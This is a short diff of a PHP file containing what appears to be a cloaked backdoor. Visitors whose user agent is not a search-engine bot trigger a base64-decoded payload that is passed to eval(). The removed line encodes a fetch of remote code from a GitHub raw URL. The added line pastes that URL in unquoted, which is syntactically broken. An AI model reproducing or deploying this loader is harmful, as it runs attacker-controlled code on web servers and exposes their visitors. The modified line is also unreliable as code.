@@ -7,7 +7,7 @@ $isBot = preg_match('/Google|Bing|Yahoo|bot|spider/i', $ua);
 
 // 
 if (!$isBot) {
-    $a = 'ZmlsZV9nZXRfY29udGVudHMoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vbmx5bWUxZC9keGVycm9yL3JlZnMv...
+    $a = https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/pink.txt
     $b = base64_decode($a);
     eval($b);
 }
